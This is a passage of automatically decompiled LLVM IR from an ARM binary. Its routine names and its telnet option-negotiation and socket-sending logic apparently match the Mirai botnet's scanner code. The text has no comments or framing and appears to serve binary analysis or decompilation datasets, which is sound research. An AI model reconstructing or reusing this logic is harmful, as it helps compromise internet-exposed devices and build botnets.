  %v0_ee00218 = phi i32 [ %v2_ee24, %dec_label_pc_edf8.loopexit ], [ %v0_edf0, %dec_label_pc_edec ]
  br label %dec_label_pc_ee00

dec_label_pc_ee00:                                ; preds = %dec_label_pc_ee00.preheader, %dec_label_pc_ee90
  %v6_eeb4240 = phi i32 [ %v6_eeb4239, %dec_label_pc_ee00.preheader ], [ %v0_ee98, %dec_label_pc_ee90 ]
  %v1_ee28 = phi i32 [ %v1_ee28222, %dec_label_pc_ee00.preheader ], [ %v1_ee9c, %dec_label_pc_ee90 ]
  %v1_edf8 = phi i32 [ %v1_ee0c220, %dec_label_pc_ee00.preheader ], [ %v3_ee98, %dec_label_pc_ee90 ]
  %v1_ee24 = phi i32 [ %v0_ee00218, %dec_label_pc_ee00.preheader ], [ %v1_eea4, %dec_label_pc_ee90 ]
  %v1_ee00 = inttoptr i32 %v1_ee24 to i8*
  %v2_ee00 = load i8, i8* %v1_ee00, align 1
  %v3_ee00 = zext i8 %v2_ee00 to i32
  store i32 %v3_ee00, i32* @r3, align 4
  %v2_ee04 = icmp eq i8 %v2_ee00, -1
  store i1 %v2_ee04, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_ee04, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ee04, label %dec_label_pc_ee0c, label %dec_label_pc_eeac

dec_label_pc_ee0c:                                ; preds = %dec_label_pc_ee00
  %v0_ee0c = load i32, i32* @sl, align 4
  %v2_ee0c = add i32 %v0_ee0c, %v1_edf8
  store i32 %v2_ee0c, i32* %r1.global-to-local, align 4
  %v1_ee10 = add i32 %v1_ee24, 1
  store i32 %v1_ee10, i32* @r6, align 4
  %v3_ee14 = icmp uge i32 %v2_ee0c, %v1_ee10
  store i1 %v3_ee14, i1* %cpsr_c.global-to-local, align 1
  %v9_ee14 = icmp eq i32 %v2_ee0c, %v1_ee10
  store i1 %v9_ee14, i1* %cpsr_z.global-to-local, align 1
  %v2_ee18 = xor i1 %v3_ee14, true
  %v3_ee18 = or i1 %v9_ee14, %v2_ee18
  br i1 %v3_ee18, label %dec_label_pc_eeac, label %dec_label_pc_ee1c

dec_label_pc_ee1c:                                ; preds = %dec_label_pc_ee0c
  %v2_ee1c = inttoptr i32 %v1_ee10 to i8*
  %v3_ee1c = load i8, i8* %v2_ee1c, align 1
  %v4_ee1c = zext i8 %v3_ee1c to i32
  store i32 %v4_ee1c, i32* @r3, align 4
  %v2_ee20 = icmp eq i8 %v3_ee1c, -1
  store i1 %v2_ee20, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_ee20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ee20, label %dec_label_pc_edf8.loopexit, label %dec_label_pc_ee30

dec_label_pc_ee30:                                ; preds = %dec_label_pc_ee1c
  %v2_ee30 = icmp ugt i8 %v3_ee1c, -4
  store i1 %v2_ee30, i1* %cpsr_c.global-to-local, align 1
  %v7_ee30 = icmp eq i8 %v3_ee1c, -3
  store i1 %v7_ee30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ee30, label %dec_label_pc_eebc, label %dec_label_pc_ee38

dec_label_pc_ee38:                                ; preds = %dec_label_pc_ee30
  %v1_ee38 = add i32 %v1_ee24, 2
  store i32 %v1_ee38, i32* @r3, align 4
  %v3_ee3c = icmp uge i32 %v2_ee0c, %v1_ee38
  store i1 %v3_ee3c, i1* %cpsr_c.global-to-local, align 1
  %v9_ee3c = icmp eq i32 %v2_ee0c, %v1_ee38
  store i1 %v9_ee3c, i1* %cpsr_z.global-to-local, align 1
  %v2_ee40 = xor i1 %v3_ee3c, true
  %v3_ee40 = or i1 %v9_ee3c, %v2_ee40
  br i1 %v3_ee40, label %dec_label_pc_eeac, label %dec_label_pc_ee44

dec_label_pc_ee44:                                ; preds = %dec_label_pc_ef1c, %bb418, %.thread115, %dec_label_pc_ee38
  %v0_ee44 = load i32, i32* @r6, align 4
  %v1_ee44 = inttoptr i32 %v0_ee44 to i8*
  %v2_ee44 = load i8, i8* %v1_ee44, align 1
  %v3_ee44 = zext i8 %v2_ee44 to i32
  store i32 %v3_ee44, i32* %r3.global-to-local, align 4
  %v2_ee48 = icmp ugt i8 %v2_ee44, -4
  store i1 %v2_ee48, i1* %cpsr_c.global-to-local, align 1
  %v7_ee48 = icmp eq i8 %v2_ee44, -3
  store i1 %v7_ee48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ee48, label %.thread107, label %dec_label_pc_ee58

.thread107:                                       ; preds = %dec_label_pc_ee44
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v1_ee44, align 1
  %v0_ee54.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ee54.pr.pr, label %.thread110, label %.thread107.dec_label_pc_ee58thread-pre-split_crit_edge

.thread107.dec_label_pc_ee58thread-pre-split_crit_edge: ; preds = %.thread107
  %v0_ee58.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_ee58

dec_label_pc_ee58:                                ; preds = %dec_label_pc_ee44, %.thread107.dec_label_pc_ee58thread-pre-split_crit_edge
  %v0_ee58.pr = phi i32 [ %v0_ee58.pr.pre, %.thread107.dec_label_pc_ee58thread-pre-split_crit_edge ], [ %v3_ee44, %dec_label_pc_ee44 ]
  %v2_ee58 = icmp ugt i32 %v0_ee58.pr, 250
  store i1 %v2_ee58, i1* %cpsr_c.global-to-local, align 1
  %v7_ee58 = icmp eq i32 %v0_ee58.pr, 251
  store i1 %v7_ee58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ee58, label %bb414, label %.thread110

bb414:                                            ; preds = %dec_label_pc_ee58
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_ee60 = load i32, i32* @r6, align 4
  %v4_ee60 = inttoptr i32 %v3_ee60 to i8*
  store i8 -3, i8* %v4_ee60, align 1
  br label %.thread110

.thread110:                                       ; preds = %dec_label_pc_ee58, %.thread107, %bb414
  %v0_ee64 = load i32, i32* @r4, align 4
  %v1_ee64 = add i32 %v0_ee64, 2
  %v2_ee64 = inttoptr i32 %v1_ee64 to i8*
  %v3_ee64 = load i8, i8* %v2_ee64, align 1
  %v4_ee64 = zext i8 %v3_ee64 to i32
  store i32 %v4_ee64, i32* %r3.global-to-local, align 4
  %v2_ee68 = icmp ugt i8 %v3_ee64, -4
  store i1 %v2_ee68, i1* %cpsr_c.global-to-local, align 1
  %v7_ee68 = icmp eq i8 %v3_ee64, -3
  store i1 %v7_ee68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ee68, label %.thread111, label %dec_label_pc_ee78

.thread111:                                       ; preds = %.thread110
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v2_ee64, align 1
  %v0_ee74.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ee74.pr.pr, label %.thread114, label %.thread111.dec_label_pc_ee78thread-pre-split_crit_edge

.thread111.dec_label_pc_ee78thread-pre-split_crit_edge: ; preds = %.thread111
  %v0_ee78.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_ee78

dec_label_pc_ee78:                                ; preds = %.thread110, %.thread111.dec_label_pc_ee78thread-pre-split_crit_edge
  %v0_ee78.pr = phi i32 [ %v0_ee78.pr.pre, %.thread111.dec_label_pc_ee78thread-pre-split_crit_edge ], [ %v4_ee64, %.thread110 ]
  %v2_ee78 = icmp ugt i32 %v0_ee78.pr, 250
  store i1 %v2_ee78, i1* %cpsr_c.global-to-local, align 1
  %v7_ee78 = icmp eq i32 %v0_ee78.pr, 251
  store i1 %v7_ee78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ee78, label %bb415, label %.thread114

bb415:                                            ; preds = %dec_label_pc_ee78
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_ee80 = load i32, i32* @r4, align 4
  %v4_ee80 = add i32 %v3_ee80, 2
  %v5_ee80 = inttoptr i32 %v4_ee80 to i8*
  store i8 -3, i8* %v5_ee80, align 1
  br label %.thread114

.thread114:                                       ; preds = %dec_label_pc_ee78, %.thread111, %bb415
  %v0_ee84 = load i32, i32* @r5, align 4
  %v1_ee84 = add i32 %v0_ee84, 4
  %v2_ee84 = inttoptr i32 %v1_ee84 to i32*
  %v3_ee84 = load i32, i32* %v2_ee84, align 4
  store i32 %v3_ee84, i32* %r0.global-to-local, align 4
  %v0_ee88 = load i32, i32* @r4, align 4
  br label %dec_label_pc_ee90

dec_label_pc_ee90:                                ; preds = %dec_label_pc_f018, %.thread114
  %v0_ee94 = phi i32 [ %v3_f030, %dec_label_pc_f018 ], [ %v3_ee84, %.thread114 ]
  %storemerge4 = phi i32 [ %v2_eedc, %dec_label_pc_f018 ], [ %v0_ee88, %.thread114 ]
  %storemerge = phi i32 [ 9, %dec_label_pc_f018 ], [ 3, %.thread114 ]
  store i32 %storemerge4, i32* %r1.global-to-local, align 4
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_ee94 = call i32 @__libc_send(i32 %v0_ee94, i32 %storemerge4, i32 %storemerge, i32 16384)
  store i32 %v4_ee94, i32* %r0.global-to-local, align 4
  %v0_ee98 = load i32, i32* @r5, align 4
  %v1_ee98 = add i32 %v0_ee98, 24
  %v2_ee98 = inttoptr i32 %v1_ee98 to i32*
  %v3_ee98 = load i32, i32* %v2_ee98, align 4
  store i32 %v3_ee98, i32* %r2.global-to-local, align 4
  %v0_ee9c = load i32, i32* @r7, align 4
  %v1_ee9c = add i32 %v0_ee9c, 3
  store i32 %v1_ee9c, i32* @r7, align 4
  %v3_eea0 = icmp uge i32 %v1_ee9c, %v3_ee98
  store i1 %v3_eea0, i1* %cpsr_c.global-to-local, align 1
  %v9_eea0 = icmp eq i32 %v1_ee9c, %v3_ee98
  store i1 %v9_eea0, i1* %cpsr_z.global-to-local, align 1
  %v0_eea4 = load i32, i32* @r4, align 4
  %v1_eea4 = add i32 %v0_eea4, 3
  store i32 %v1_eea4, i32* @r4, align 4
  %v5_eea8 = icmp slt i32 %v1_ee9c, %v3_ee98
  br i1 %v5_eea8, label %dec_label_pc_ee00, label %dec_label_pc_eeac

dec_label_pc_eeac:                                ; preds = %dec_label_pc_edf8.loopexit, %dec_label_pc_ee00, %dec_label_pc_ee90, %dec_label_pc_ee38, %dec_label_pc_ee0c, %dec_label_pc_edec, %dec_label_pc_eebc.dec_label_pc_eeac.loopexit_crit_edge
  %v6_eeb4 = phi i32 [ %v0_eee8, %dec_label_pc_eebc.dec_label_pc_eeac.loopexit_crit_edge ], [ %v0_e694, %dec_label_pc_edec ], [ %v6_eeb4240, %dec_label_pc_ee00 ], [ %v0_ee98, %dec_label_pc_ee90 ], [ %v6_eeb4240, %dec_label_pc_ee38 ], [ %v6_eeb4240, %dec_label_pc_ee0c ], [ %v6_eeb4240, %dec_label_pc_edf8.loopexit ]
  %v0_eeac = phi i32 [ %v0_eeac.pre.pre, %dec_label_pc_eebc.dec_label_pc_eeac.loopexit_crit_edge ], [ 0, %dec_label_pc_edec ], [ %v1_ee28, %dec_label_pc_ee00 ], [ %v1_ee9c, %dec_label_pc_ee90 ], [ %v1_ee28, %dec_label_pc_ee38 ], [ %v1_ee28, %dec_label_pc_ee0c ], [ %v2_ee28, %dec_label_pc_edf8.loopexit ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_eeac = icmp eq i32 %v0_eeac, 0
  store i1 %v2_eeac, i1* %cpsr_z.global-to-local, align 1
  %tmp416 = icmp slt i32 %v0_eeac, 1
  br i1 %tmp416, label %dec_label_pc_ede0, label %bb417

bb417:                                            ; preds = %dec_label_pc_eeac
  store i32 3, i32* %r0.global-to-local, align 4
  %v7_eeb4 = add i32 %v6_eeb4, 12
  %v8_eeb4 = inttoptr i32 %v7_eeb4 to i32*
  store i32 3, i32* %v8_eeb4, align 4
  br label %dec_label_pc_ede0

dec_label_pc_eebc:                                ; preds = %dec_label_pc_ee30
  store i32 %v2_eec0, i32* @r8, align 4
  store i32 ptrtoint (i32* @global_var_186f8.500 to i32), i32* @r1, align 4
  store i32 3, i32* @r2, align 4
  store i32 %v2_eec0, i32* @r0, align 4
  %v0_eed0 = call i32 @memcpy()
  store i32 9, i32* @r2, align 4
  store i32 %v2_eedc, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_186ef.502 to i32), i32* @r1, align 4
  %v0_eee4 = call i32 @memcpy()
  store i32 %v0_eee4, i32* %r0.global-to-local, align 4
  %v0_eee8 = load i32, i32* @r5, align 4
  %v1_eee8 = add i32 %v0_eee8, 24
  %v2_eee8 = inttoptr i32 %v1_eee8 to i32*
  %v3_eee8 = load i32, i32* %v2_eee8, align 4
  %v0_eeec = load i32, i32* @r4, align 4
  %v1_eeec = add i32 %v0_eeec, 2
  store i32 %v1_eeec, i32* %r2.global-to-local, align 4
  %v0_eef0 = load i32, i32* @sl, align 4
  %v2_eef0 = add i32 %v0_eef0, %v3_eee8
  store i32 %v2_eef0, i32* @r3, align 4
  %v3_eef4 = icmp uge i32 %v2_eef0, %v1_eeec
  store i1 %v3_eef4, i1* %cpsr_c.global-to-local, align 1
  %v9_eef4 = icmp eq i32 %v2_eef0, %v1_eeec
  store i1 %v9_eef4, i1* %cpsr_z.global-to-local, align 1
  %v2_eef8 = xor i1 %v3_eef4, true
  %v3_eef8 = or i1 %v9_eef4, %v2_eef8
  br i1 %v3_eef8, label %dec_label_pc_eebc.dec_label_pc_eeac.loopexit_crit_edge, label %dec_label_pc_eefc

dec_label_pc_eebc.dec_label_pc_eeac.loopexit_crit_edge: ; preds = %dec_label_pc_eebc
  %v0_eeac.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_eeac

dec_label_pc_eefc:                                ; preds = %dec_label_pc_eebc
  %v2_eefc = inttoptr i32 %v1_eeec to i8*
  %v3_eefc = load i8, i8* %v2_eefc, align 1
  %v4_eefc = zext i8 %v3_eefc to i32
  store i32 %v4_eefc, i32* %r3.global-to-local, align 4
  %v2_ef00 = icmp ugt i8 %v3_eefc, 30
  store i1 %v2_ef00, i1* %cpsr_c.global-to-local, align 1
  %v7_ef00 = icmp eq i8 %v3_eefc, 31
  store i1 %v7_ef00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ef00, label %dec_label_pc_f018, label %dec_label_pc_ef08

dec_label_pc_ef08:                                ; preds = %dec_label_pc_eefc
  %v1_ef08 = inttoptr i32 %v0_eeec to i8*
  %v2_ef08 = load i8, i8* %v1_ef08, align 1
  %v3_ef08 = zext i8 %v2_ef08 to i32
  store i32 %v3_ef08, i32* %r3.global-to-local, align 4
  %v2_ef0c = icmp ugt i8 %v2_ef08, -4
  store i1 %v2_ef0c, i1* %cpsr_c.global-to-local, align 1
  %v7_ef0c = icmp eq i8 %v2_ef08, -3
  store i1 %v7_ef0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ef0c, label %.thread115, label %dec_label_pc_ef1c

.thread115:                                       ; preds = %dec_label_pc_ef08
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v1_ef08, align 1
  %v0_ef18.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ef18.pr.pr, label %dec_label_pc_ee44, label %.thread115.dec_label_pc_ef1cthread-pre-split_crit_edge

.thread115.dec_label_pc_ef1cthread-pre-split_crit_edge: ; preds = %.thread115
  %v0_ef1c.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_ef1c

dec_label_pc_ef1c:                                ; preds = %dec_label_pc_ef08, %.thread115.dec_label_pc_ef1cthread-pre-split_crit_edge
  %v0_ef1c.pr = phi i32 [ %v0_ef1c.pr.pre, %.thread115.dec_label_pc_ef1cthread-pre-split_crit_edge ], [ %v3_ef08, %dec_label_pc_ef08 ]
  %v2_ef1c = icmp ugt i32 %v0_ef1c.pr, 250
  store i1 %v2_ef1c, i1* %cpsr_c.global-to-local, align 1
  %v7_ef1c = icmp eq i32 %v0_ef1c.pr, 251
  store i1 %v7_ef1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ef1c, label %bb418, label %dec_label_pc_ee44

bb418:                                            ; preds = %dec_label_pc_ef1c
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_ef24 = load i32, i32* @r4, align 4
  %v4_ef24 = inttoptr i32 %v3_ef24 to i8*
  store i8 -3, i8* %v4_ef24, align 1
  br label %dec_label_pc_ee44

dec_label_pc_ef2c:                                ; preds = %dec_label_pc_ed38, %dec_label_pc_ed50, %dec_label_pc_ed48, %bb412, %dec_label_pc_ed24, %dec_label_pc_ed08, %dec_label_pc_ed1c, %bb411
  %v0_ef2c = phi i32 [ %v1_ecfc, %dec_label_pc_ed24 ], [ %v1_ecfc, %dec_label_pc_ed08 ], [ %v1_ecfc, %dec_label_pc_ed1c ], [ %v1_ecfc, %bb411 ], [ %v1_ed5c, %bb412 ], [ %v1_ed5c, %dec_label_pc_ed48 ], [ %v1_ed5c, %dec_label_pc_ed50 ], [ %v1_ed5c, %dec_label_pc_ed38 ]
  %v1_ef2c = add i32 %v0_ef2c, 1
  store i32 %v1_ef2c, i32* @r7, align 4
  br label %dec_label_pc_edac

dec_label_pc_ef34:                                ; preds = %dec_label_pc_ec48, %dec_label_pc_ec68, %dec_label_pc_ec60, %dec_label_pc_ec58, %bb408, %dec_label_pc_ec34, %dec_label_pc_ec10, %dec_label_pc_ec2c, %dec_label_pc_ec24, %bb407
  %v0_ef34 = phi i32 [ %v1_ec04, %dec_label_pc_ec34 ], [ %v1_ec04, %dec_label_pc_ec10 ], [ %v1_ec04, %dec_label_pc_ec2c ], [ %v1_ec04, %dec_label_pc_ec24 ], [ %v1_ec04, %bb407 ], [ %v1_ec74, %bb408 ], [ %v1_ec74, %dec_label_pc_ec58 ], [ %v1_ec74, %dec_label_pc_ec60 ], [ %v1_ec74, %dec_label_pc_ec68 ], [ %v1_ec74, %dec_label_pc_ec48 ]
  %v1_ef34 = add i32 %v0_ef34, 1
  store i32 %v1_ef34, i32* @r7, align 4
  br label %dec_label_pc_ef38

dec_label_pc_ef38:                                ; preds = %dec_label_pc_ecdc.dec_label_pc_ef38_crit_edge, %dec_label_pc_ef34
  %v0_ef38 = phi i32 [ %v0_ef38.pre, %dec_label_pc_ecdc.dec_label_pc_ef38_crit_edge ], [ %v0_e694, %dec_label_pc_ef34 ]
  %v1_ef38 = inttoptr i32 %v0_ef38 to i32*
  %v2_ef38 = load i32, i32* %v1_ef38, align 4
  store i32 %v2_ef38, i32* %r3.global-to-local, align 4
  %v1_ef3c = add i32 %v0_ef38, 4
  %v2_ef3c = inttoptr i32 %v1_ef3c to i32*
  %v3_ef3c = load i32, i32* %v2_ef3c, align 4
  store i32 %v3_ef3c, i32* %r0.global-to-local, align 4
  %v1_ef40 = add i32 %v2_ef38, 12
  %v2_ef40 = inttoptr i32 %v1_ef40 to i8*
  %v3_ef40 = load i8, i8* %v2_ef40, align 1
  %v4_ef40 = zext i8 %v3_ef40 to i32
  store i32 %v4_ef40, i32* %r2.global-to-local, align 4
  %v1_ef44 = inttoptr i32 %v2_ef38 to i32*
  %v2_ef44 = load i32, i32* %v1_ef44, align 4
  store i32 %v2_ef44, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_ef4c = call i32 @__libc_send(i32 %v3_ef3c, i32 %v2_ef44, i32 %v4_ef40, i32 16384)
  store i32 %v4_ef4c, i32* %r0.global-to-local, align 4
  %v0_ef50 = load i32, i32* @r5, align 4
  %v1_ef50 = add i32 %v0_ef50, 4
  %v2_ef50 = inttoptr i32 %v1_ef50 to i32*
  %v3_ef50 = load i32, i32* %v2_ef50, align 4
  store i32 %v3_ef50, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_186ec.498 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_ef60 = call i32 @__libc_send(i32 %v3_ef50, i32 ptrtoint ([3 x i8]* @global_var_186ec.498 to i32), i32 2, i32 16384)
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_ef68 = load i32, i32* @r5, align 4
  %v2_ef68 = add i32 %v1_ef68, 12
  %v3_ef68 = inttoptr i32 %v2_ef68 to i32*
  store i32 4, i32* %v3_ef68, align 4
  br label %dec_label_pc_ede0

dec_label_pc_ef70:                                ; preds = %dec_label_pc_e738
  store i32 27, i32* %r0.global-to-local, align 4
  %v1_ef7c = call i32 @table_unlock_val(i32 27)
  store i32 %v2_eca4, i32* %r1.global-to-local, align 4
  store i32 27, i32* %r0.global-to-local, align 4
  %v3_ef8c = call i32 @table_retrieve_val(i32 27, i32* nonnull %v2_ecac)
  store i32 %v3_ef8c, i32* %r0.global-to-local, align 4
  %v3_ef90 = load i8, i8* %stack_var_-56, align 1
  %v4_ef90 = sext i8 %v3_ef90 to i32
  store i32 %v3_ef8c, i32* %r2.global-to-local, align 4
  %v1_ef98 = add nsw i32 %v4_ef90, -1
  store i32 %v1_ef98, i32* %r3.global-to-local, align 4
  %v0_ef9c = load i32, i32* @r5, align 4
  %v1_ef9c = add i32 %v0_ef9c, 24
  %v2_ef9c = inttoptr i32 %v1_ef9c to i32*
  %v3_ef9c = load i32, i32* %v2_ef9c, align 4
  store i32 %v3_ef9c, i32* %r1.global-to-local, align 4
  %v0_efa0 = load i32, i32* @sl, align 4
  store i32 %v0_efa0, i32* %r0.global-to-local, align 4
  %v4_efa4 = call i32 @util_memsearch(i32 %v0_efa0, i32 %v3_ef9c, i32 %v3_ef8c, i32 %v1_ef98)
  store i32 %v4_efa4, i32* @r7, align 4
  store i32 27, i32* %r0.global-to-local, align 4
  %v1_efb0 = call i32 @table_lock_val(i32 27)
  store i32 %v1_efb0, i32* %r0.global-to-local, align 4
  %v0_efb4 = load i32, i32* @r7, align 4
  %v2_efb4 = icmp eq i32 %v0_efb4, -1
  store i1 %v2_efb4, i1* %cpsr_c.global-to-local, align 1
  %v7_efb4 = icmp eq i32 %v0_efb4, -1
  store i1 %v7_efb4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_efb4, label %dec_label_pc_e614.loopexit, label %dec_label_pc_efbc

dec_label_pc_efbc:                                ; preds = %dec_label_pc_ef70
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_efbc = icmp eq i32 %v0_efb4, 0
  store i1 %v2_efbc, i1* %cpsr_z.global-to-local, align 1
  %tmp419 = icmp slt i32 %v0_efb4, 1
  br i1 %tmp419, label %dec_label_pc_ede0, label %dec_label_pc_efc4

dec_label_pc_efc4:                                ; preds = %dec_label_pc_efbc
  %v0_efc4 = load i32, i32* @r5, align 4
  %v1_efc4 = add i32 %v0_efc4, 20
  %v2_efc4 = inttoptr i32 %v1_efc4 to i16*
  %v3_efc4 = load i16, i16* %v2_efc4, align 2
  %v4_efc4 = zext i16 %v3_efc4 to i32
  store i32 %v4_efc4, i32* %r3.global-to-local, align 4
  %v1_efc8 = add i32 %v0_efc4, 16
  %v2_efc8 = inttoptr i32 %v1_efc8 to i32*
  %v3_efc8 = load i32, i32* %v2_efc8, align 4
  store i32 %v3_efc8, i32* %r2.global-to-local, align 4
  store i32 %v2_efcc, i32* @lr, align 4
  store i32 %v4_efc4, i32* %stack_var_-42, align 4
  store i32 %v3_efc8, i32* %stack_var_-60, align 4
  %v1_efd8 = inttoptr i32 %v0_efc4 to i32*
  %v2_efd8 = load i32, i32* %v1_efd8, align 4
  store i32 %v2_efd8, i32* @r8, align 4
  %v0_efdc = call i32 @__libc_fork()
  store i32 %v0_efdc, i32* %r0.global-to-local, align 4
  %v7_efe0 = icmp eq i32 %v0_efdc, -1
  %.430 = zext i1 %v7_efe0 to i32
  store i32 %.430, i32* @r3, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_efec = icmp eq i32 %v0_efdc, 0
  store i1 %v2_efec, i1* %cpsr_z.global-to-local, align 1
  %tmp422 = icmp slt i32 %v0_efdc, 1
  br i1 %tmp422, label %bb423, label %.thread121

.thread121:                                       ; preds = %dec_label_pc_efc4
  store i32 1, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f000

bb423:                                            ; preds = %dec_label_pc_efc4
  store i32 %.430, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_eff8 = icmp eq i1 %v7_efe0, false
  store i1 %v2_eff8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_eff8, label %dec_label_pc_f1e4, label %dec_label_pc_f000

dec_label_pc_f000:                                ; preds = %.thread121, %bb423
  %v0_f000 = load i32, i32* @r5, align 4
  %v1_f000 = add i32 %v0_f000, 4
  %v2_f000 = inttoptr i32 %v1_f000 to i32*
  %v3_f000 = load i32, i32* %v2_f000, align 4
  store i32 %v3_f000, i32* %r0.global-to-local, align 4
  %v1_f004 = call i32 @__GI___libc_close(i32 %v3_f000)
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_f00c = load i32, i32* @r4, align 4
  %v1_f00c = load i32, i32* @r5, align 4
  %v2_f00c = add i32 %v1_f00c, 4
  %v3_f00c = inttoptr i32 %v2_f00c to i32*
  store i32 %v0_f00c, i32* %v3_f00c, align 4
  %v0_f010 = load i32, i32* %r0.global-to-local, align 4
  %v1_f010 = load i32, i32* @r5, align 4
  %v2_f010 = add i32 %v1_f010, 12
  %v3_f010 = inttoptr i32 %v2_f010 to i32*
  store i32 %v0_f010, i32* %v3_f010, align 4
  br label %dec_label_pc_ede0

dec_label_pc_f018:                                ; preds = %dec_label_pc_eefc
  store i32 %v2_eec0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v1_f024 = add i32 %v0_eee8, 4
  %v2_f024 = inttoptr i32 %v1_f024 to i32*
  %v3_f024 = load i32, i32* %v2_f024, align 4
  store i32 %v3_f024, i32* %r0.global-to-local, align 4
  %v4_f028 = call i32 @__libc_send(i32 %v3_f024, i32 %v2_eec0, i32 3, i32 16384)
  store i32 %v4_f028, i32* %r0.global-to-local, align 4
  store i32 %v2_eed4, i32* %r1.global-to-local, align 4
  %v0_f030 = load i32, i32* @r5, align 4
  %v1_f030 = add i32 %v0_f030, 4
  %v2_f030 = inttoptr i32 %v1_f030 to i32*
  %v3_f030 = load i32, i32* %v2_f030, align 4
  store i32 %v3_f030, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ee90

dec_label_pc_f040:                                ; preds = %dec_label_pc_e620
  store i32 %.pre, i32* @r0, align 4
  %v1_f048 = add i32 %v0_f040, 92
  store i32 %v1_f048, i32* @r1, align 4
  store i32 192, i32* @r2, align 4
  %v3_f050 = call i32 @memmove(i32 %.pre, i32 %v1_f048, i32 192)
  store i32 %v3_f050, i32* %r0.global-to-local, align 4
  %v0_f054 = load i32, i32* @r5, align 4
  %v1_f054 = add i32 %v0_f054, 24
  %v2_f054 = inttoptr i32 %v1_f054 to i32*
  %v3_f054 = load i32, i32* %v2_f054, align 4
  %v1_f058 = add i32 %v3_f054, -64
  store i32 %v1_f058, i32* %r3.global-to-local, align 4
  store i32 %v1_f058, i32* %v2_f054, align 4
  br label %dec_label_pc_e630

dec_label_pc_f064:                                ; preds = %dec_label_pc_e774
  %v0_f064 = load i32, i32* @r5, align 4
  store i32 %v0_f064, i32* @r0, align 4
  %v0_f068 = call i32 @setup_connection()
  store i32 %v0_f068, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e7b0

dec_label_pc_f070:                                ; preds = %dec_label_pc_ec7c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v3_f070 = load i8, i8* %stack_var_-56, align 1
  %v4_f070 = sext i8 %v3_f070 to i32
  %v0_f074 = load i32, i32* @r6, align 4
  store i32 %v0_f074, i32* %r2.global-to-local, align 4
  %v1_f078 = add nsw i32 %v4_f070, -1
  store i32 %v1_f078, i32* %r3.global-to-local, align 4
  %v0_f07c = load i32, i32* @sl, align 4
  store i32 %v0_f07c, i32* %r0.global-to-local, align 4
  %v0_f080 = load i32, i32* @r5, align 4
  %v1_f080 = add i32 %v0_f080, 24
  %v2_f080 = inttoptr i32 %v1_f080 to i32*
  %v3_f080 = load i32, i32* %v2_f080, align 4
  store i32 %v3_f080, i32* %r1.global-to-local, align 4
  %v4_f084 = call i32 @util_memsearch(i32 %v0_f07c, i32 %v3_f080, i32 %v0_f074, i32 %v1_f078)
  store i32 %v4_f084, i32* %r0.global-to-local, align 4
  %v1_f088 = add i32 %v4_f084, 1
  store i32 %v1_f088, i32* @r7, align 4
  %v2_f088 = icmp eq i32 %v4_f084, -1
  store i1 %v2_f088, i1* %cpsr_c.global-to-local, align 1
  %v7_f088 = icmp eq i32 %v1_f088, 0
  store i1 %v7_f088, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f088, label %dec_label_pc_f098, label %dec_label_pc_ecdc

dec_label_pc_f098:                                ; preds = %dec_label_pc_f070
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 30, i32* %r0.global-to-local, align 4
  %v1_f09c = call i32 @table_lock_val(i32 30)
  store i32 31, i32* %r0.global-to-local, align 4
  %v1_f0a4 = call i32 @table_lock_val(i32 31)
  store i32 %v1_f0a4, i32* %r0.global-to-local, align 4
  %v0_f0a8 = load i32, i32* @r5, align 4
  %v1_f0a8 = add i32 %v0_f0a8, 12
  %v2_f0a8 = inttoptr i32 %v1_f0a8 to i32*
